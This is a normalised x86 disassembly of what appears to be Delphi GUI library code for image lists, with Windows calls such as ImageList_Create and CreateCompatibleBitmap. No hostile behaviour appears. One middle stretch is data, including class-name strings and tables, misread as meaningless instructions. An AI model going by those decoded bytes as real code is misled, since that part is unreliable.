mov eax edi
call sub_46227c
mov edx [ ebx + 0x74 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x7c ]
mov eax edi
call sub_4623b4
mov edx [ ebx + 0x80 ]
mov eax edi
call sub_462414
mov dx [ ebx + 0x84 ]
mov eax edi
call sub_462470
mov dl [ ebx + 0x86 ]
mov eax edi
call sub_4624d4
push [ ebx + 0x44 ]
push [ ebx + 0x40 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x48 ]
mov [ edi + 0x48 ] eax
mov eax [ ebx + 0x4c ]
mov [ edi + 0x4c ] eax
mov eax [ ebx + 0x38 ]
mov [ edi + 0x38 ] eax
mov eax [ ebx + 0x3c ]
mov [ edi + 0x3c ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_462114
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x64 ]
call sub_404388
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x64 ]
mov edx [ esp ]
call sub_403fd0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_462174
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x1
xor edx edx
push ebp
push sub_46226c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x69 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x68 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x69 ] bl
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jle r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
inc esi
dec edi
jne r-xdata
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
call sub_461ccc
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
mov edx esi
call sub_461cb8
mov ebx eax
cmp ebx [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx + 0x6c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x6c ]
jne r-xdata
xor edx edx
mov eax ebx
call sub_462174
sub_46227c
push ebx
push esi
push edi
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x6a ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov dl [ eax + 0x58 ]
cmp dl 0x1
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
cmp dl 0x2
jne r-xdata
mov al [ esp ]
mov [ ebx + 0x6a ] al
jmp r-xdata
inc edi
dec esi
jne r-xdata
mov dl [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ esp ] 0x1
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_4622f4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax ebp
mov edx [ ebx + 0x78 ]
call sub_404388
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
lea eax [ ebx + 0x78 ]
mov edx ebp
call sub_403fd0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418dc4
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
sub_46235c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x74 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x74 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_4623b4
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov edx [ ebx + 0x7c ]
call sub_404388
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
lea eax [ ebx + 0x7c ]
mov edx [ esp ]
call sub_403fd0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_462414
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
cmp eax [ ebx + 0x80 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
mov [ ebx + 0x80 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_462470
push ebx
push esi
push edi
push ecx
mov [ esp ] dx
mov ebx eax
mov ax [ esp ]
cmp ax [ ebx + 0x84 ]
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov ax [ esp ]
mov [ ebx + 0x84 ] ax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov dx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_4624d4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x86 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebp + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebp + 0x86 ] bl
mov eax ebp
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x50 ]
call sub_418dc4
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x74 ]
mov eax [ ebp + 0x50 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ r-xdata ]
call sub_40339c
test eax eax
je r-xdata
sub_462534
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x64 ]
call sub_404388
jne r-xdata
xor eax eax
jmp r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov ebx eax
mov edx edi
mov eax esi
call sub_421844
test bl bl
je r-xdata
mov al 0x1
test [ ebx + 0x1c ] 0x1
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_462114
sub_462580
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x8a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_4625a8
push ebx
mov ebx eax
xor eax eax
mov edx [ ebx + 0x5c ]
test edx edx
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x44 ]
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ edx + 0x58 ] 0x0
jne r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x95 ] 0x0
je r-xdata
pop ebx
retn
xor eax eax
jmp r-xdata
mov eax ebx
call sub_461ad4
test al al
jne r-xdata
cmp [ ebx + 0x69 ] 0x0
je r-xdata
mov al 0x1
mov dl [ ebx + 0x69 ]
xor dl 0x1
mov eax ebx
call sub_462174
cmp [ ebx + 0x69 ] 0x0
je r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
sub_462630
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x90 ] eax
sub_462664
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x90 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jg r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_462694
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41ada4
mov edi eax
mov eax esi
call sub_465570
movzx ecx ax
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_4626c0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
cmp bp ax
jne r-xdata
sub_462704
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462729
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462730
retn
sub_462764
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
daa
inc esi
add [ edi + 0x100046 ] dh
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x42 ] bh
inc esi
add [ ecx ] al
add bh bh
[ edx + eax * 2 + 0x540b0046 ]
sub_4627b6
inc ebx
push 0x65676e61
dec esp
imul ebp [ esi + 0x6b ] r-xdata
add ecx [ 0x61724454 ]
ja r-xdata
insd
popad
push es
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
mov eax eax
mov al 0x28
inc esi
popad
dec ecx
outsb
js r-xdata
inc esi
add [ ecx ] al
or edx [ ecx + ecx * 2 + 0x6d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al al
daa
inc esi
add [ edi ] al
jae r-xdata
pop esp
pop ss
inc edx
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add [ ecx + ebp + 0x46 ] bh
add [ ebx + esi + 0x46 ] bh
add [ eax - 0x7bffb9d6 ] cl
inc eax
inc esi
add [ eax ] dl
inc ecx
inc esi
add [ eax + 0x1004639 ] cl
add bh ch
[ eax + 0x10004639 ]
push esp
inc ebx
jne r-xdata
add [ edx + ebx + 0x42 ] bl
imul esi [ ebp + ecx * 2 + 0x61 ] 0x49076b73
insd
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ ebx ] ecx
push esp
dec ecx
insd
add [ eax ] al
add [ eax + ebp ] dl
inc esi
add [ edi ] al
imul esi [ ecx + ecx * 2 + 0x6d ] 0x6656761
outsd
arpl [ ebp + 0x73 ] si
or ah [ ebx + esi * 2 + 0x53 ]
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + esi * 2 + 0x4e ] ah
outsd
jb r-xdata
mov eax 0x20000000
retn
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
or eax 0x72547364
popad
outsb
jae r-xdata
pop ds
retn
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] 0x1400408d
sub [ esi ] eax
pop es
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
sub [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
popad
jb r-xdata
ror [ ebx - 0x16aa173a ] cl
sti
inc edi
inc esi
xor al 0x10
add [ eax ] al
add bh al
inc esi
xor [ eax ] dl
add [ eax ] al
add [ ebx - 0xef743a ] cl
push edx
xor al 0x8b
mov [ ebx + ebx * 8 - 0xe17f08c ] 0xb
cli
jmp [ edi + ecx * 4 + 0x5 ]
outsd
insd
dec ecx
insd
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push 0x2004175
add [ edi ] al
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0xc08b0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
sub [ esi ] al
cld
sub [ esi ] al
push 0x6c000000
je r-xdata
outsb
je r-xdata
mov eax eax
sbb [ eax ] ch
inc esi
add [ ebx ] al
or dl [ ecx + ecx * 2 + 0x6d ]
popad
push esp
jns r-xdata
dec ecx
insd
dec esp
imul esi [ ebx + 0x74 ] 0x2818c08b
add [ eax + 0x34 ] al
inc eax
add [ eax + 0x48004213 ] dh
xor al 0x40
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ edx + ebp ] bl
inc esi
add [ eax + 0x38 ] cl
inc esi
add al dl
cmp eax [ esi ]
mov [ edi ] dh
inc esi
add [ edi + edx ] bh
inc edx
add [ eax ] cl
push ss
inc edx
add [ edi + edx + 0x42 ] cl
add [ eax + ebx + 0x42 ] al
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
sub_46297c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4212ec
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_4629c8
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_4212ec
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_462a1c
push ebx
push esi
push edi
call sub_4035b8
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418eac
mov edx eax
mov eax edi
call sub_4639e8
mov eax [ edi + 0x50 ]
call sub_4031ec
mov eax edi
call sub_462d78
mov eax [ edi + 0x4c ]
call sub_4031ec
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421338
test bl bl
jle r-xdata
call sub_4031ec
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
sub_462a88
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_462b35
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_463970
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_462b54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462b3c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
sub_462b54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_462bf5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_42af5c
mov eax ebx
call sub_42a3dc
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424f74
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_41776c
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_42a3dc
pop edx
call sub_425318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462bfc
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_462c18
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_462b54
pop ecx
pop edx
pop ebx
retn
sub_462c50
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_462b40
test al al
je r-xdata
mov eax esi
call sub_463310
mov eax esi
call sub_462b54
mov eax esi
mov si 0xffef
call sub_4033e8
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_462c94
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_462b40
test al al
je r-xdata
mov eax esi
call sub_463310
mov eax esi
call sub_462b54
mov eax esi
mov si 0xffef
call sub_4033e8
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_462cd8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_462d78
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_462c18
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4033e8
sub_462d24
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4638f8
test ebx ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov eax ebx
call sub_42a448
cmp al 0x1
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x64 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_462d78
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4033e8
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_462d14
push eax
call ImageList_Destroy
sub_462db0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_462e43
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
xor eax eax
mov al [ ebx + 0x41 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xfe
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_462b40
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462e4a
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
mov edx eax
mov eax ebx
call sub_46331c
sub_462e50
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_462eff
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_462ee2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_462b48
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_462d24
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_462d24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462ee9
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
sub_462f1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46301b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push 0x0
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_462d24
push eax
mov eax [ ebp - 0x4 ]
call sub_462d14
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463022
mov eax [ ebp - 0xc ]
call sub_4031ec
retn
cmp esi 0xffffffff
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_462fdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx esi
mov eax [ ebp - 0x10 ]
call sub_42b300
mov eax [ ebp - 0x4 ]
call sub_462b48
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_462d04
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_462d24
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4031ec
retn
sub_463038
push ebx
mov ebx eax
mov eax ebx
call sub_462b40
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_462d14
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_46305c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463273
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_462b40
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4033e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46327a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fa0
retn
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4638f8
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_462f1c
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405d64
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb0c
call sub_4039b8
xor eax eax
push ebp
push sub_463224
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_463204
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_429e14
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
